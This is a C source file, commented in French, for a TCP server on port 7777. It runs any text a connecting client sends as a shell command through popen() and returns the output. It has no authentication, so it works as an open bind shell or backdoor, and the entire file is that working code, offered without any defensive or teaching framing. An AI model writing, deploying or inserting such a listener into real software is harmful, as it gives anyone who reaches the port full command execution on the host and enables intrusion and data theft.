// tcp_server.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 7777
#define BUFFER_SIZE 1024

int main() {
    int server_fd, client_fd;
    struct sockaddr_in address;
    int addr_len = sizeof(address);
    char buffer[BUFFER_SIZE];
    char command_output[BUFFER_SIZE];

    // Création du socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Erreur de création du socket");
        exit(EXIT_FAILURE);
    }

    // Configuration de l'adresse
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Attachement du socket au port
    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("Erreur de liaison du socket");
        exit(EXIT_FAILURE);
    }

    // Écoute des connexions entrantes
    if (listen(server_fd, 3) < 0) {
        perror("Erreur d'écoute");
        exit(EXIT_FAILURE);
    }

    printf("Serveur en écoute sur le port %d...\n", PORT);

    while (1) {
        // Accepter une connexion entrante
        if ((client_fd = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&addr_len)) < 0) {
            perror("Erreur d'acceptation");
            exit(EXIT_FAILURE);
        }

        printf("Connexion acceptée.\n");

        while (1) {
            memset(buffer, 0, BUFFER_SIZE);
            memset(command_output, 0, BUFFER_SIZE);

            // Lire la commande envoyée par le client
            int bytes_read = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
            if (bytes_read <= 0) {
                printf("Client déconnecté.\n");
                break;
            }

            buffer[bytes_read] = '\0';
            printf("Commande reçue : %s\n", buffer);

            // Quitter si la commande est "exit"
            if (strcmp(buffer, "exit") == 0) {
                printf("Fermeture de la connexion.\n");
                break;
            }

            // Exécution de la commande
            FILE *fp = popen(buffer, "r");
            if (fp == NULL) {
                snprintf(command_output, BUFFER_SIZE, "Erreur lors de l'exécution de la commande.\n");
            } else {
                fread(command_output, 1, BUFFER_SIZE - 1, fp);
                pclose(fp);
            }

            // Envoyer le résultat au client
            send(client_fd, command_output, strlen(command_output), 0);
        }

        close(client_fd);
    }

    close(server_fd);
    return 0;
}
